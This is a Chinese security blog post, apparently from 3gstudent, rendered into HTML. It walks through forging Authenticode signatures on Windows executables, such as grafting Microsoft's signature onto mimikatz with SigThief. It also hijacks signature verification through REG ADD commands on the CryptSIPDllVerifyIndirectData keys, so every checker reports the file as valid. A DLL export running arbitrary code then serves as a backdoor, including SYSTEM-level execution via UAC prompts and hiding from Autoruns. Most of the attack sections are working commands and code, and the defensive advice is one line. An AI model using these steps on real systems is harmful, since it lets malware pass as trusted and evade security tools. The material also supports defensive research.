@@ -1,0 +1,376 @@
+I"�@<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在上一篇文章<a href="https://3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7">《CAT文件数字签名使用技巧》</a>介绍了证书签名的基础知识，Windows系统下向文件签名有两种方法：添加在文件末尾(Authenticode)和CAT文件(catalog)，本文将介绍Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持</p>
+
+<p><strong>注：</strong></p>
+
+<p>本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。</p>
+
+<p><strong>参考资料：</strong></p>
+
+<p>https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</p>
+
+<p>http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</p>
+
+<p>https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+<ul>
+  <li>PE文件的Authenticode签名伪造</li>
+  <li>劫持签名验证过程，实现代码执行，作为后门</li>
+</ul>
+
+<h2 id="0x02-pe文件的签名伪造">0x02 PE文件的签名伪造</h2>
+<hr />
+
+<p>Authenticode的详细说明文档可参考：</p>
+
+<p>http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx</p>
+
+<p>部分系统文件会包含微软的签名，例如<code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code></p>
+
+<p>通过文件属性能够看到相关签名信息，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-1.png" alt="Alt text" /></p>
+
+<p>通过powershell验证，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature C:\Windows\System32\consent.exe
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-2.png" alt="Alt text" /></p>
+
+<p>借助工具CFF Explorer获取文件结构，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-3.png" alt="Alt text" /></p>
+
+<p>Security Directory RVA代码数字签名在PE文件中的偏移位置
+Security DirectorySize代表数字签名的长度</p>
+
+<p>将这部分内容提取，复制到另一个文件test.exe的尾部，同时使用<code class="language-plaintext highlighter-rouge">CFF Explorer</code>修改test.exe对应的<code class="language-plaintext highlighter-rouge">Security Directory RVA</code>和<code class="language-plaintext highlighter-rouge">Security DirectorySize</code></p>
+
+<p>这样，就实现了数字签名的伪造</p>
+
+<p>开源工具SigThief可自动实现以上过程，地址如下：</p>
+
+<p>https://github.com/secretsquirrel/SigThief</p>
+
+<h3 id="实际测试">实际测试：</h3>
+
+<p>测试系统： Win7</p>
+
+<p>将<code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code>的数字签名复制到mimikatz.exe中</p>
+
+<p>参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i C:\Windows\System32\consent.exe -t mimikatz.exe -o si.exe 
+</code></pre></div></div>
+
+<p>生成si.exe，具有微软数字签名，但提示证书无效，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-4.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>部分测试系统无法使用sigthief.py，提示找不到0x9，将系统激活即可</p>
+
+<p>通过powershell验证，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\si.exe
+</code></pre></div></div>
+
+<p>显示HashMismatch，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-5.png" alt="Alt text" /></p>
+
+<p>通过signtool.exe验证：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v si.exe
+</code></pre></div></div>
+
+<p>显示<code class="language-plaintext highlighter-rouge">SignTool Error: WinVerifyTrust returned error: 0x80096010</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-6.png" alt="Alt text" /></p>
+
+<p>通过sigcheck.exe验证：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q si.exe
+</code></pre></div></div>
+
+<p>显示<code class="language-plaintext highlighter-rouge">The digital signature of the object did not verify</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-7.png" alt="Alt text" /></p>
+
+<h2 id="0x03-修改配置使签名通过验证">0x03 修改配置，使签名通过验证</h2>
+<hr />
+
+<p>查看<code class="language-plaintext highlighter-rouge">Get-AuthenticodeSignature</code>的帮助说明：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Help Get-AuthenticodeSignature -Full 
+</code></pre></div></div>
+
+<p>查看相关操作<code class="language-plaintext highlighter-rouge">Set-AuthenticodeSignature</code>的帮助说明：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Help Set-AuthenticodeSignature -Full
+</code></pre></div></div>
+
+<p>发现该命令的功能：</p>
+
+<blockquote>
+  <p>The Set-AuthenticodeSignature cmdlet adds an Authenticode signature to
+any file that supports Subject Interface Package (SIP).</p>
+</blockquote>
+
+<p>关于SIP的资料，可参考：</p>
+
+<p>https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/</p>
+
+<p>获得有用的信息：</p>
+
+<blockquote>
+  <p>There are some included as part of the OS (at least on Vista). Locate
+in the %WINDIR%\System32 directory. They usually have a naming ending
+with sip.dll, i.e. msisip.dll is the Microsoft Installer (.msi) SIP.</p>
+</blockquote>
+
+<p>寻找Windows下的SIP:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls C:\Windows\System32\*sip.dll -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+
+<p>Win7下只有一个：<code class="language-plaintext highlighter-rouge">C:\Windows\System32\msisip.dll</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>Matt Graeber的测试系统为Win10，可以找到多个dll</p>
+
+<p>使用IDA打开该dll，查看函数<code class="language-plaintext highlighter-rouge">DllRegisterServer()</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-1.png" alt="Alt text" /></p>
+
+<p>找到一个特别的名称MsiSIPVerifyIndirectData，字面意思像是签名验证功能</p>
+
+<p>查找资料，找到该函数，地址如下：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/windows/desktop/cc542591%28v=vs.85%29.aspx</p>
+
+<p>发现该函数，返回TRUE代表验证成功，返回FALSE代表验证失败</p>
+
+<p>该功能对应注册表键值，位置如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-2.png" alt="Alt text" /></p>
+
+<p>不同GUID对应不同文件格式的验证，例如：</p>
+
+<ul>
+  <li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
+  <li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.cat文件</li>
+  <li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL 		.ctl文件</li>
+  <li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet 	.cab文件</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>GUID说明引用自<a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">《Subverting Trust in Windows》</a> Page4</p>
+
+<p>接下来，尝试替换<code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}</code>下的dll和FuncName</p>
+
+<p>通过c++实现，创建dll，添加导出函数，格式参照<code class="language-plaintext highlighter-rouge">CryptSIPVerifyIndirectData</code>，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL WINAPI CryptSIPVerifyIndirectData(SIP_SUBJECTINFO *pSubjectInfo, SIP_INDIRECT_DATA *pIndirectData)
+{
+	return TRUE;
+}
+</code></pre></div></div>
+
+<p>编译生成signtest.dll</p>
+
+<p>修改注册表：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "CryptSIPVerifyIndirectData" /f
+</code></pre></div></div>
+
+<p>重新启动cmd，使用powershell进行验证：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\si.exe
+</code></pre></div></div>
+
+<p>显示Valid，校验成功</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-3.png" alt="Alt text" /></p>
+
+<p>通过signtool.exe验证：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v si.exe
+</code></pre></div></div>
+
+<p>验证通过</p>
+
+<p>通过sigcheck.exe验证：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q si.exe
+</code></pre></div></div>
+
+<p>验证通过，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-4.png" alt="Alt text" /></p>
+
+<p>重启explorer.exe，查看文件属性，签名状态，显示签名生效，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-5.png" alt="Alt text" /></p>
+
+<p>更进一步，<strong>dll一定要固定格式吗？</strong></p>
+
+<p>于是进行接下来的测试：</p>
+
+<p>导出函数名为test1，完整代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+					 )
+{
+    return TRUE;
+}
+BOOL WINAPI test1() 
+{
+	return TRUE;
+}
+</code></pre></div></div>
+
+<p>修改对应注册表键值：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "test1" /f
+</code></pre></div></div>
+
+<p>测试仍能够绕过验证</p>
+
+<p>这就说明，只要dll的导出函数返回TRUE，就能够绕过验证</p>
+
+<p>所以，可以查找系统默认的dll，找到一个导出函数返回true即可（当然，此处可供利用的导出函数有很多）</p>
+
+<p>例如<code class="language-plaintext highlighter-rouge">"C:\Windows\System32\ntdll.dll" </code></p>
+
+<p>导出函数：<code class="language-plaintext highlighter-rouge">DbgUiContinue</code></p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
+</code></pre></div></div>
+
+<p>这样，就不需要在系统上留下自己编写的dll</p>
+
+<p>对于64位系统，存在32位的注册表键值</p>
+
+<p>如果使用32位的程序，如32位的signtool和sigcheck，为了绕过验证，还需要修改32位的注册表键值，对应代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
+
+REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
+</code></pre></div></div>
+
+<h2 id="0x04-签名验证劫持">0x04 签名验证劫持</h2>
+<hr />
+
+<p>修改注册表，编写dll实现对签名验证过程的绕过，如果我们在dll的导出函数里面加入自己的代码，这就实现了签名验证劫持</p>
+
+<p>在签名验证中加入执行代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+					 )
+{
+    return TRUE;
+}
+BOOL WINAPI test1() 
+{
+	WinExec("calc.exe",SW_SHOWNORMAL);
+	return TRUE;
+}
+</code></pre></div></div>
+
+<p>只要涉及签名验证的操作，加载我们自己的dll，就会弹出计算器</p>
+
+<p>以下程序会使用签名验证操作：</p>
+
+<ul>
+  <li>DllHost.exe - When the “Digital Signatures” tab is displayed in file properties</li>
+  <li>Process Explorer - When the “Verified Signer” tab is displayed</li>
+  <li>Autoruns</li>
+  <li>Sigcheck</li>
+  <li>consent.exe - Any time a UAC prompt is displayed</li>
+  <li>signtool.exe</li>
+  <li>smartscreen.exe</li>
+  <li>Get-AuthenticodeSignature</li>
+  <li>Set-AuthenticodeSignature</li>
+  <li>Security vendor software that performs certificate validation based on calls to WinVerifyTrust.</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>该处引用自<a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">《Subverting Trust in Windows》</a> Page33</p>
+
+<p>例如，查看文件属性-数字签名详细信息，加载dll，弹出计算器，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-1.png" alt="Alt text" /></p>
+
+<p>特别的，以管理员权限执行程序会弹出UAC，如果对此进行劫持，此时的权限为system</p>
+
+<p>完整操作如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-2.gif" alt="Alt text" /></p>
+
+<h3 id="补充">补充：</h3>
+
+<p><strong>1、dll劫持</strong></p>
+
+<p>有些GUID，默认注册表的dll路径为相对路径，这里就存在dll劫持的问题，不需要修改注册表也能实现绕过签名验证</p>
+
+<p><strong>2、Hiding from Autoruns</strong></p>
+
+<p>启动项检测工具Autoruns默认不显示带有微软签名的文件，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/5-1.png" alt="Alt text" /></p>
+
+<p>如果文件包含微软签名，默认不会显示在Autoruns面板</p>
+
+<h2 id="0x05-防御建议">0x05 防御建议</h2>
+<hr />
+
+<p>部分白名单程序默认会信任带有微软证书的文件，这里就存在隐患</p>
+
+<p>建议不要盲目相信证书</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文介绍了Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持，下一篇文章将继续介绍Authenticode签名的伪造技巧——针对文件类型的签名伪造。</p>
+
+<p>最后感谢Matt Graeber的分享。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
